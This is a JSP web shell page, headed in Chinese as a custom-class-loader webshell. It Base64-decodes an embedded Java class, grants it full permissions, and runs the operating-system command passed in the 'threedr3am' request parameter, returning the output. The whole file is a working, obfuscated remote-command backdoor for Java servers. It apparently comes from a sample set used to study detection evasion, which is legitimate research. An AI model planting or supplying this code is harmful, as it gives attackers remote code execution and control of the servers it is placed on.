<%@ page import="java.security.PermissionCollection" %>
<%@ page import="java.security.Permissions" %>
<%@ page import="java.security.AllPermission" %>
<%@ page import="java.security.ProtectionDomain" %>
<%@ page import="java.security.CodeSource" %>
<%@ page import="java.security.cert.Certificate" %>
<%@ page import="java.util.Base64" %>
<html>
<body>
<h2>自定义类加载器的JSP Webshell</h2>
<%
    response.getOutputStream().write(new ClassLoader() {

        @Override
        public Class<?> loadClass(String name) throws ClassNotFoundException {
            if (name.contains("Threedr3am_2")) {
                return findClass(name);
            }
            return super.loadClass(name);
        }

        @Override
        protected Class<?> findClass(String name) throws ClassNotFoundException {
            try {
                byte[] bytes = Base64.getDecoder().decode("yv66vgAAADQAiAoAGgA+BwA/CgACAD4HAEAHAEEKAEIAQwoAQgBECgBFAEYKAAUARwoABABICgAEAEkKAAIASggASwoAAgBMCQAQAE0HAE4KAE8AUAgAUQoAUgBTCgBUAFUKAFQAVgoAVwBYCgBZAFoJAFsAXAoAXQBeBwBfAQADcmVzAQASTGphdmEvbGFuZy9TdHJpbmc7AQAGPGluaXQ+AQAVKExqYXZhL2xhbmcvU3RyaW5nOylWAQAEQ29kZQEAD0xpbmVOdW1iZXJUYWJsZQEAEkxvY2FsVmFyaWFibGVUYWJsZQEABHRoaXMBAA5MVGhyZWVkcjNhbV8yOwEAA2NtZAEADXN0cmluZ0J1aWxkZXIBABlMamF2YS9sYW5nL1N0cmluZ0J1aWxkZXI7AQAOYnVmZmVyZWRSZWFkZXIBABhMamF2YS9pby9CdWZmZXJlZFJlYWRlcjsBAARsaW5lAQANU3RhY2tNYXBUYWJsZQcATgcAYAcAPwcAQAEACkV4Y2VwdGlvbnMHAGEBAAh0b1N0cmluZwEAFCgpTGphdmEvbGFuZy9TdHJpbmc7AQAEbWFpbgEAFihbTGphdmEvbGFuZy9TdHJpbmc7KVYBAARhcmdzAQATW0xqYXZhL2xhbmcvU3RyaW5nOwEAC2lucHV0U3RyZWFtAQAVTGphdmEvaW8vSW5wdXRTdHJlYW07AQAFYnl0ZXMBAAJbQgEABGNvZGUBAApTb3VyY2VGaWxlAQARVGhyZWVkcjNhbV8yLmphdmEMAB0AYgEAF2phdmEvbGFuZy9TdHJpbmdCdWlsZGVyAQAWamF2YS9pby9CdWZmZXJlZFJlYWRlcgEAGWphdmEvaW8vSW5wdXRTdHJlYW1SZWFkZXIHAGMMAGQAZQwAZgBnBwBoDABpAGoMAB0AawwAHQBsDABtADIMAG4AbwEAAQoMADEAMgwAGwAcAQAMVGhyZWVkcjNhbV8yBwBwDABxAHIBABJUaHJlZWRyM2FtXzIuY2xhc3MHAHMMAHQAdQcAdgwAdwB4DAB5AHoHAHsMAHwAfwcAgAwAgQCCBwCDDACEAIUHAIYMAIcAHgEAEGphdmEvbGFuZy9PYmplY3QBABBqYXZhL2xhbmcvU3RyaW5nAQATamF2YS9pby9JT0V4Y2VwdGlvbgEAAygpVgEAEWphdmEvbGFuZy9SdW50aW1lAQAKZ2V0UnVudGltZQEAFSgpTGphdmEvbGFuZy9SdW50aW1lOwEABGV4ZWMBACcoTGphdmEvbGFuZy9TdHJpbmc7KUxqYXZhL2xhbmcvUHJvY2VzczsBABFqYXZhL2xhbmcvUHJvY2VzcwEADmdldElucHV0U3RyZWFtAQAXKClMamF2YS9pby9JbnB1dFN0cmVhbTsBABgoTGphdmEvaW8vSW5wdXRTdHJlYW07KVYBABMoTGphdmEvaW8vUmVhZGVyOylWAQAIcmVhZExpbmUBAAZhcHBlbmQBAC0oTGphdmEvbGFuZy9TdHJpbmc7KUxqYXZhL2xhbmcvU3RyaW5nQnVpbGRlcjsBAA9qYXZhL2xhbmcvQ2xhc3MBAA5nZXRDbGFzc0xvYWRlcgEAGSgpTGphdmEvbGFuZy9DbGFzc0xvYWRlcjsBABVqYXZhL2xhbmcvQ2xhc3NMb2FkZXIBABNnZXRSZXNvdXJjZUFzU3RyZWFtAQApKExqYXZhL2xhbmcvU3RyaW5nOylMamF2YS9pby9JbnB1dFN0cmVhbTsBABNqYXZhL2lvL0lucHV0U3RyZWFtAQAJYXZhaWxhYmxlAQADKClJAQAEcmVhZAEABShbQilJAQAQamF2YS91dGlsL0Jhc2U2NAEACmdldEVuY29kZXIBAAdFbmNvZGVyAQAMSW5uZXJDbGFzc2VzAQAcKClMamF2YS91dGlsL0Jhc2U2NCRFbmNvZGVyOwEAGGphdmEvdXRpbC9CYXNlNjQkRW5jb2RlcgEADmVuY29kZVRvU3RyaW5nAQAWKFtCKUxqYXZhL2xhbmcvU3RyaW5nOwEAEGphdmEvbGFuZy9TeXN0ZW0BAANvdXQBABVMamF2YS9pby9QcmludFN0cmVhbTsBABNqYXZhL2lvL1ByaW50U3RyZWFtAQAHcHJpbnRsbgAhABAAGgAAAAEAAAAbABwAAAADAAEAHQAeAAIAHwAAANIABgAFAAAARyq3AAG7AAJZtwADTbsABFm7AAVZuAAGK7YAB7YACLcACbcACk4ttgALWToExgASLBkEtgAMEg22AAxXp//qKiy2AA61AA+xAAAAAwAgAAAAHgAHAAAADgAEAA8ADAAQACUAEgAvABMAPgAVAEYAFgAhAAAANAAFAAAARwAiACMAAAAAAEcAJAAcAAEADAA7ACUAJgACACUAIgAnACgAAwAsABsAKQAcAAQAKgAAABsAAv8AJQAEBwArBwAsBwAtBwAuAAD8ABgHACwALwAAAAQAAQAwAAEAMQAyAAEAHwAAAC8AAQABAAAABSq0AA+wAAAAAgAgAAAABgABAAAAGgAhAAAADAABAAAABQAiACMAAAAJADMANAACAB8AAACEAAIABAAAACgSELYAERIStgATTCu2ABS8CE0rLLYAFVe4ABYstgAXTrIAGC22ABmxAAAAAgAgAAAAGgAGAAAAHgALAB8AEgAgABgAIQAgACIAJwAjACEAAAAqAAQAAAAoADUANgAAAAsAHQA3ADgAAQASABYAOQA6AAIAIAAIADsAHAADAC8AAAAEAAEAMAACADwAAAACAD0AfgAAAAoAAQBZAFcAfQAJ");
                PermissionCollection pc = new Permissions();
                pc.add(new AllPermission());
                ProtectionDomain protectionDomain = new ProtectionDomain(new CodeSource(null, (Certificate[]) null), pc, this, null);
                return this.defineClass(name, bytes, 0, bytes.length, protectionDomain);
            } catch (Exception e) {
                e.printStackTrace();
            }
            return super.findClass(name);
        }
    }.loadClass("Threedr3am_2").getConstructor(String.class).newInstance(request.getParameter("threedr3am")).toString().getBytes());
%>
</body>
</html>